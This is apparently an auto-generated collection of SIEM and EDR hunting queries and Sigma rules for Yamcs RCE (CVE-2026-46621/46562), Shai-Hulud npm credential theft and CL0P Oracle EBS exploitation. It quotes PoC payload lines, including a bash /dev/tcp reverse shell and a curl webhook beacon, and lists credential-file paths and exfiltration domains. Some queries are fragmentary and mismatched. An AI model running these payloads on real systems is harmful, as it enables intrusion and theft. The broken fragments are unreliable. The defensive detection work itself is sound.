File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or SHA1 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or MD5 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or SHA1 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or MD5 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).

Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Yamcs MDB algorithm PATCH with embedded Jython java.lang.Runtime payload (CVE-2026-46621) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-46621: Yamcs Vulnerable to Authenticated Remote Code

[LLM] Yamcs MDB algorithm PATCH with embedded Jython java.lang.Runtime payload (CVE-2026-46621) Exploitation High
Hunts the CVE-2026-46621 exploitation request: an authenticated HTTP PATCH to /api/mdb/{instance}/realtime/algorithms/{name} whose JSON body contains Jython-to-Java escape strings (java.lang.Runtime, getRuntime, import java). This is the article's exact exploit primitive — overwriting a Python algorithm's text via the MDB REST API to break out of the JSR-223 sandbox. Rationale: Pivots on the exact exploit primitive from the GHSA advisory: PATCH /api/mdb/{instance}/realtime/algorithms/{name} body containing 'java.lang.Runtime', 'getRuntime', or 'import java'. These tokens have no legitimate place in a Python/Jython algorithm in normal Yamcs operations — they are the Jython-to-Java escape. Cross-checked against the GHSA-2g95-6x5q-xjwj advisory PoC. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/006/ • https://nvd.nist.gov/vuln/detail/CVE-2026-46621
ATT&CKT1190 T1059.006 T1078
Data sourcesWeb.Web
// Yamcs runs as a JVM; web traffic to its REST API is usually proxied or visible as DeviceNetworkEvents to TCP/8090. Defender's HTTP-body visibility is limited — pair with the WAF/reverse-proxy log source.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 8090 or LocalPort == 8090
| where InitiatingProcessFileName !in~ ("java.exe","java")
| where AdditionalFields has_any ("PATCH","/api/mdb/","/realtime/algorithms/")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, LocalPort, AdditionalFields
| order by Timestamp desc
// Detect HTTP PATCH to Yamcs MDB algorithms endpoint carrying Jython-to-Java escape strings.
let algoEndpoint = @"/api/mdb/[^/]+/realtime/algorithms/";
let jythonPayloadTokens = dynamic(["java.lang.Runtime","getRuntime","import java","Runtime.getRuntime","exec([\"bash\"","exec([\"sh\"","exec([\"cmd\""]);
union isfuzzy=true
(W3CIISLog
  | where TimeGenerated > ago(7d)
  | where csMethod =~ "PATCH"
  | where csUriStem matches regex algoEndpoint
  | extend Src = cIP, User = csUserName, Uri = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), UA = csUserAgent, Body = ""
  | project TimeGenerated, Src, User, Uri, UA, Body, Status = scStatus),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestMethod =~ "PATCH"
  | where RequestURL matches regex algoEndpoint
  | extend Src = SourceIP, User = SourceUserName, Uri = RequestURL, UA = RequestClientApplication, Body = coalesce(AdditionalExtensions, Message), Status = tostring(EventOutcome)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpMethod =~ "PATCH"
  | where Url matches regex algoEndpoint
  | extend Src = SrcIpAddr, User = SrcUsername, Uri = Url, UA = HttpRequestHeaderUserAgent, Body = "", Status = tostring(HttpStatusCode)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status)
| where Body has_any (jythonPayloadTokens) or Uri has_any (jythonPayloadTokens)
| order by TimeGenerated desc
title: Yamcs MDB Algorithm PATCH with Jython java.lang.Runtime Payload (CVE-2026-46621)
id: 6a3e9b1c-2d4e-4b1e-9b6f-7e8b1c2d4e3a
status: experimental
description: Detects HTTP PATCH to the Yamcs Mission Database algorithms endpoint with a request body containing Jython-to-Java escape strings used in CVE-2026-46621 (java.lang.Runtime / getRuntime / import java).
references:
  - https://github.com/advisories/GHSA-2g95-6x5q-xjwj
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access
  - attack.execution
  - attack.t1190
  - attack.t1059.006
  - cve.2026.46621
logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'PATCH'
  selection_uri:
    cs-uri-stem|contains:
      - '/api/mdb/'
      - '/realtime/algorithms/'
  selection_payload:
    cs-uri-query|contains:
      - 'java.lang.Runtime'
      - 'getRuntime'
      - 'import java'
      - 'Runtime.getRuntime'
  condition: selection_method and selection_uri and selection_payload
falsepositives:
  - Internal red-team / vulnerability scanners replaying the PoC
  - Yamcs developers legitimately referencing java.lang in algorithm text (rare — algorithms are domain-specific)
level: high
(source:nginx OR source:apache OR source:haproxy OR source:linux.syslog) @http.method:PATCH @http.url_details.path:*/api/mdb/*/realtime/algorithms/* (@http.request.body:(*java.lang.Runtime* OR *getRuntime* OR *"import java"*) OR @http.url_details.queryString:(*java.lang.Runtime* OR *getRuntime*))
// Falcon FDR generally does not capture HTTP request bodies. Closest pivot is post-exploitation process tree (see UC 2). Returning host-side hit on the curl beacon that the payload triggers.
#event_simpleName=ProcessRollup2
| ImageFileName=/\/curl$/i OR ImageFileName=/\/bash$/i OR ImageFileName=/\/sh$/i
| ParentBaseFileName=/^java$/i
| CommandLine=/RCE|webhook|interactsh|requestbin|ngrok|trycloudflare/i
| groupBy([aid, ComputerName, ImageFileName, ParentBaseFileName, CommandLine], function=count())
WEB

[LLM] Yamcs JVM spawns shell or network utility (CVE-2026-46621 post-exploitation) Installation High
Hunts the host-side payoff of CVE-2026-46621: a java/jython process under the Yamcs service forking bash, sh, curl, wget, nc, python or similar OS utilities. Yamcs is a telemetry processing JVM — under normal operations its process tree does not fork shells or network clients. Rationale: Article PoC: 'java.lang.Runtime.getRuntime().exec(["bash", "-c", "curl https://<YOUR-WEBHOOK-URL>/RCE"])' — the Yamcs JVM directly forks bash + curl. Pinning to parent=java/jython with a yamcs-context check on the parent commandline keeps FPs near zero because the Yamcs JVM has no legitimate need to fork shells. Cross-checked against MITRE T1059.006 (Python) and T1059.004 (Unix Shell). Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.004 T1059.006 T1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython")
| where FileName in~ ("bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe")
| where InitiatingProcessCommandLine has_any ("yamcs","jython","algorithm","ScriptEngine","AlgorithmManager") or InitiatingProcessFolderPath has_any ("yamcs","jython")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Sentinel: Yamcs JVM (java/jython) spawning a shell or network utility — host-side CVE-2026-46621 payoff.
let ShellOrNet = dynamic(["bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe"]);
let YamcsCtx = dynamic(["yamcs","jython","algorithm","ScriptEngine","AlgorithmManager"]);
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessName has_any ("java","jython")
  | where TargetProcessName has_any (ShellOrNet)
  | where ParentProcessCommandLine has_any (YamcsCtx) or ActingProcessCommandLine has_any (YamcsCtx) or TargetProcessCommandLine has_any (YamcsCtx)
  | project TimeGenerated, Host = DvcHostname, User = ActorUsername,
            ParentImage = ParentProcessName, ParentCmd = ParentProcessCommandLine,
            ChildImage = TargetProcessName, ChildCmd = TargetProcessCommandLine),
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("java.exe","jython.exe","\\java","\\jython")
  | where NewProcessName has_any ("\\bash.exe","\\sh.exe","\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\curl.exe","\\wget.exe","\\nc.exe","\\ncat.exe","\\python.exe","\\python3.exe")
  | where CommandLine has_any (YamcsCtx) or ParentProcessName has_any (YamcsCtx)
  | project TimeGenerated, Host = Computer, User = SubjectUserName,
            ParentImage = ParentProcessName, ParentCmd = "",
            ChildImage = NewProcessName, ChildCmd = CommandLine),
(Syslog
  | where TimeGenerated > ago(7d)
  | where Facility =~ "authpriv" or ProcessName has_any ("audit","auditd","sudo")
  | where SyslogMessage has "java" and SyslogMessage has_any (ShellOrNet)
  | where SyslogMessage has_any (YamcsCtx)
  | project TimeGenerated, Host = HostName, User = "", ParentImage = "java", ParentCmd = SyslogMessage, ChildImage = "", ChildCmd = "")
| order by TimeGenerated desc

[LLM] Yamcs Java process beacons to webhook / interact / tunneling service (CVE-2026-46621 C2) Command & Control High
Hunts the article's C2 footprint: the Yamcs JVM (or a curl/wget it spawned) making an outbound connection to short-lived webhook / out-of-band-interaction services (webhook.site, requestbin, interactsh, ngrok, trycloudflare, beeceptor). Anchored to the Yamcs JVM as initiating process so we don't blanket-alert on internet usage. Rationale: Article PoC literally calls 'curl https://<YOUR-WEBHOOK-URL>/RCE' from Runtime.exec. Anchoring to (a) the Yamcs JVM or a curl/wget spawned by it AND (b) the well-known OOB-interaction domain list keeps this high-signal: a Yamcs telemetry server has no legitimate need to talk to webhook.site or interactsh. Cross-checked against the CVE-2026-46621 PoC and ProjectDiscovery's Interactsh public domain list. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://github.com/projectdiscovery/interactsh • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","en7","interact.sh","interactsh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython","curl","curl.exe","wget","wget.exe")
| where (RemoteUrl has_any (oobDomains)) or (isnotempty(AdditionalFields) and AdditionalFields has_any (oobDomains))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","interact.sh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
union isfuzzy=true
(DnsEvents
  | where TimeGenerated > ago(7d)
  | where Name has_any (oobDomains)
  | project TimeGenerated, Host = Computer, Src = ClientIP, Domain = Name, Process = "", Cmd = ""),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestURL has_any (oobDomains) or DestinationHostName has_any (oobDomains)
  | project TimeGenerated, Host = SourceHostName, Src = SourceIP, Domain = coalesce(DestinationHostName, RequestURL), Process = SourceProcessName, Cmd = ""),
(ImNetworkSession
  | where TimeGenerated > ago(7d)
  | where DstHostname has_any (oobDomains) or Url has_any (oobDomains)
  | project TimeGenerated, Host = DvcHostname, Src = SrcIpAddr, Domain = coalesce(DstHostname, Url), Process = "", Cmd = ""),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpHostName has_any (oobDomains) or Url has_any (oobDomains)
  | project TimeGenerated, Host = DvcHostname, Src = SrcIpAddr, Domain = coalesce(HttpHostName, Url), Process = "", Cmd = "")
| order by TimeGenerated desc

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46621")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46621")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

[LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload Exploitation High
Detects HTTP PATCH requests to the Yamcs algorithm-override endpoint where the JSON body contains Nashorn escape sequences that reach `java.lang.Runtime` — the exact CVE-2026-46562 exploit shape. Targets the request hitting any reverse proxy / WAF / web log in front of Yamcs (default port 8090). Rationale: Exploits ride the article's exact endpoint shape `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}` and require Nashorn pivot tokens (`Java.type`, `java.lang.Runtime`, `getRuntime`) in the JSON body — both are dead-giveaway strings called out in the GHSA advisory body. Legacy `5.5.0` path `/api/mdb/.../algorithms/` is also covered. No external corroboration available — advisory is sole source as of 2026-05-28.
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
// Defender Advanced Hunting has no HTTP request-body table for Yamcs front-end logs; closest pivot is inbound TCP to port 8090 followed by java spawning a shell. See UC2/UC3 for the post-exploitation half.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8090
| where InitiatingProcessFileName has_any ("java","java.exe")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let YamcsExploitTokens = dynamic(["Java.type","java.lang.Runtime","getRuntime","ProcessBuilder","/dev/tcp/"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL matches regex @"(?i)/api/mdb-overrides/[^/]+/[^/]+/algorithms/"
| where Message has_any (YamcsExploitTokens) or RequestContext has_any (YamcsExploitTokens) or AdditionalExtensions has_any (YamcsExploitTokens)
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

[LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation Installation High
Detects the Yamcs `java` process (yamcs-core JVM) directly spawning `/bin/sh`, `/bin/bash`, `dash`, or `nc` — a behaviour that never occurs in legitimate Yamcs operation. This is the immediate child-process side of the CVE-2026-46562 Nashorn RCE primitive `Java.type("java.lang.Runtime").getRuntime().exec(...)`. Rationale: Article's PoC literally runs `Java.type("java.lang.Runtime").getRuntime().exec(["bash","-c","..."])`. The unique high-fidelity signal is `java` (with `yamcs`/`org.yamcs` in its cmdline so we scope to the Yamcs JVM specifically, not arbitrary Java apps) directly forking a shell — yamcs-core itself never does this in normal operation. No external corroboration available (GHSA is sole source).

          ParentImage = InitiatingProcessFolderPath,

| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

[LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree Command & Control High
Detects the bash `exec 3<>/dev/tcp/HOST/PORT` reverse-shell file-descriptor primitive when it descends from the Yamcs JVM. This is the *exact* payload string in the CVE-2026-46562 PoC and catches the post-exploitation network pivot whether or not UC2 caught the initial spawn. Rationale: Verbatim from the GHSA PoC body: `["bash","-c","exec 3<>/dev/tcp/${LHOST}/${LPORT}; id >&3; sh -i <&3 >&3 2>&3"]`. The `/dev/tcp/` token is unique to bash-builtin reverse shells (no legitimate Yamcs subroutine writes to that pseudo-path), and constraining the parent chain to the Yamcs JVM cuts the broad LFI-style FPs that pure `/dev/tcp/` rules suffer. No external corroboration available (advisory is sole public source).
ATT&CKT1059.004 T1071.001 T1219

| where InitiatingProcessFileName =~ "java"
   or InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
   or InitiatingProcessParentFileName =~ "java"
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, ProcessCommandLine)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, ProcessCommandLine)

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget · Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) · [LLM] Bling Libra: Entra device join immediately after vishing-driven MFA registration
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Shai-Hulud exfiltration: node.exe POSTs to api.github.com creating public repo · OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) Installation High
Hunts the Shai-Hulud worm's secret-harvesting stage: a node/npm/yarn process opens AWS credentials, SSH private keys, Kubernetes kubeconfig, or GCP application-default-credentials. The article confirms TGR-CRI-1135 released an open-source version on 2026-05-13, so copycats will reuse this file-access pattern. Rationale: Article confirms TGR-CRI-1135's malware exfiltrates 'cloud access tokens, SSH keys, Kubernetes secrets' and announced the open-source Shai-Hulud release 2026-05-13. Datadog Security Labs and Unit 42 follow-up writeups confirm the exact filesystem paths (~/.aws/credentials, ~/.ssh/, ~/.kube/config, application_default_credentials.json) and that node is the executing host — making this a precise file-access pivot, not a generic 'credentials in files' rule. Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
ATT&CKT1552.001 T1195.002 T1528
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe","node","npm.exe","npm","yarn.exe","yarn","pnpm.exe","pnpm")
| where FolderPath has_any (@"\.aws\credentials", @"/.aws/credentials", @"\.ssh\id_rsa", @"/.ssh/id_rsa", @"\.ssh\id_ed25519", @"/.ssh/id_ed25519", @"\.kube\config", @"/.kube/config", @"application_default_credentials.json", @"\gcloud\credentials.db")
| where ActionType in ("FileCreated","FileModified","FileRenamed","FileAccessed")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath, FileName, ActionType, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName matches regex @"(?i)\\(node|npm|yarn|pnpm)(\.exe)?$" or ActingProcessName matches regex @"(?i)/(node|npm|yarn|pnpm)$"
| where TargetFilePath matches regex @"(?i)(\.aws[\\/]credentials|\.ssh[\\/]id_(rsa|ed25519|ecdsa)|\.kube[\\/]config|application_default_credentials\.json|gcloud[\\/]credentials\.db)"
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc
title: Shai-Hulud npm Worm Reads Cloud Credential Files
id: 9c4a1e62-1f0b-4b3a-8f3d-c7f1b3b8d401
status: experimental
description: Detects node/npm/yarn/pnpm processes accessing AWS, SSH, Kubernetes or GCP credential files — the Shai-Hulud worm's credential-harvest stage. TGR-CRI-1135 open-sourced the tool 2026-05-13.
references:
  - https://unit42.paloaltonetworks.com/cyber-extortion-economy/
  - https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
  - https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.credential_access
  - attack.t1552.001
  - attack.t1195.002
logsource:
  category: file_access
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\node.exe'
      - '\npm.exe'
      - '\yarn.exe'
      - '\pnpm.exe'
  selection_file:
    TargetFilename|contains:
      - '\.aws\credentials'
      - '\.ssh\id_rsa'
      - '\.ssh\id_ed25519'
      - '\.kube\config'
      - 'application_default_credentials.json'
      - '\gcloud\credentials.db'
  condition: selection_proc and selection_file
falsepositives:
  - Legitimate IaC tooling (terraform-wrapped node helpers, cdktf) reading AWS profile
  - Developer-machine kube/aws CLI plugin that legitimately shells out to node
level: high
source:windows.sysmon @EventID:11 @Image:(*\node.exe OR *\Node.exe OR *\NODE.EXE OR *\npm.exe OR *\NPM.EXE OR *\yarn.exe OR *\YARN.EXE OR *\pnpm.exe) @TargetFilename:(*\.aws\credentials OR *\.ssh\id_rsa* OR *\.ssh\id_ed25519* OR *\.kube\config OR *application_default_credentials.json OR *\gcloud\credentials.db)
#event_simpleName=FileOpenInfo ContextImageFileName=/\\(node|npm|yarn|pnpm)\.exe$/i
| regex("(\\\\\\.aws\\\\credentials|\\\\\\.ssh\\\\id_(rsa|ed25519|ecdsa)|\\\\\\.kube\\\\config|application_default_credentials\\.json|\\\\gcloud\\\\credentials\\.db)", field=TargetFileName)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
| _count > 0

[LLM] Shai-Hulud exfiltration: node.exe POSTs to api.github.com creating public repo Actions on Objectives Medium
Detects the Shai-Hulud worm's exfiltration channel — a node/npm process making API calls to api.github.com on a non-developer host (or burst of repo-creation API traffic). The worm dumps stolen secrets into a newly-created public GitHub repo tagged 'Sha1-Hulud: The Second Coming'. Rationale: Article ties TGR-CRI-1135 (Shai-Hulud author) to the open-source release on 2026-05-13. Datadog Security Labs and Unit 42 confirm exfil channel is a public GitHub repo created via api.github.com — pairing the credential-file read (UC1) with an outbound github.com call from the same node PID inside 10 minutes is high-fidelity vs background developer noise. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.upwind.io/feed/shai-hulud-2-npm-supply-chain-worm-attack • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/

[LLM] Bling Libra: Entra device join immediately after vishing-driven MFA registration Installation High
Detects Bling Libra's (ShinyHunters / UNC6040) post-vishing persistence pattern — within minutes of a successful interactive sign-in from a new location/IP, the same identity registers a new device (and frequently a new MFA method) on Entra ID. The article confirms the playbook is unchanged: vishing → credential+MFA intercept → register own device for persistence. Rationale: Article states Bling Libra 'continues to use vishing for initial access… and ultimately registering their own devices to establish persistence within targeted environments.' Mandiant/Google Cloud and BankInfoSecurity writeups confirm device-registration-within-30-minutes-of-suspicious-sign-in as the high-fidelity correlation. The temporal join is what distinguishes attacker registration from a user's own new laptop enrollment. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/defense-against-shinyhunters-cybercrime-saas • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://www.bankinfosecurity.com/hanging-up-on-shinyhunters-experts-detail-vishing-defenses-a-30657

[LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget Exploitation High
Hunts the post-exploit footprint of CVE-2025-61882 in Oracle E-Business Suite (Concurrent Processing) — the Java app-server process (java/oracle) spawning OS shells, wget, curl, perl or python is the canonical Cl0p webshell-drop pattern observed by Mandiant/Google Cloud against EBS 12.2.x. Rationale: Article names CVE-2025-61882 as Hazy Scorpius/CL0P's vector into Oracle EBS. Google Cloud TI and Oracle's own advisory confirm Cl0p drops Java/JSP webshells via the Concurrent Processing component; java/FNDLIBR spawning a shell/downloader on an EBS host is the cleanest live-exploit pivot. Filter for EBS-specific paths (appsutil, FMW_Home, comn/util) keeps this scoped to actual EBS servers. Cross-checked against: • https://www.oracle.com/security-alerts/alert-cve-2025-61882.html • https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation • https://www.tenable.com/blog/cve-2025-61882-faq-oracle-e-business-suite-zero-day-cl0p-and-july-2025-cpu • https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild/

title: Oracle EBS Concurrent Processing Spawns OS Shell or Downloader (CVE-2025-61882)
id: 1e7a8b04-3c6f-4a18-9b6d-72bb5a9e2c11
status: experimental
description: Detects Oracle E-Business Suite java/FNDLIBR/httpd parent processes spawning shells, wget, curl, perl, python or nc — the post-exploit footprint of CVE-2025-61882 (Cl0p / Hazy Scorpius extortion campaign).
references:
  - https://unit42.paloaltonetworks.com/cyber-extortion-economy/
  - https://www.oracle.com/security-alerts/alert-cve-2025-61882.html
  - https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access
  - attack.t1190
  - attack.t1505.003
  - cve.2025.61882
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/java'
      - '/FNDLIBR'
      - '/httpd'
    ParentCommandLine|contains:
      - 'oracle'
      - 'EBS'
      - 'fs_inst'
      - 'appsutil'
      - 'comn/util'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/ksh'
      - '/wget'
      - '/curl'
      - '/perl'
      - '/python'
      - '/python3'
      - '/nc'
      - '/ncat'
  filter_legit:
    CommandLine|contains:
      - 'adstrtal'
      - 'adstpall'
      - 'adcfgclone'
  condition: selection_parent and selection_child and not filter_legit
falsepositives:
  - Oracle EBS patching (autoconfig, adop) which legitimately spawns shells under java
  - Administrative concurrent programs that shell out by design
level: high
source:linux.auditd @auditd.type:EXECVE @process.parent.executable.path:(*/java OR */FNDLIBR OR */httpd) @process.executable.path:(*/sh OR */bash OR */ksh OR */wget OR */curl OR */perl OR */python OR */python3 OR */nc OR */ncat) -@process.command_line:(*adstrtal* OR *adstpall* OR *adcfgclone*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(java|FNDLIBR|httpd)$/i
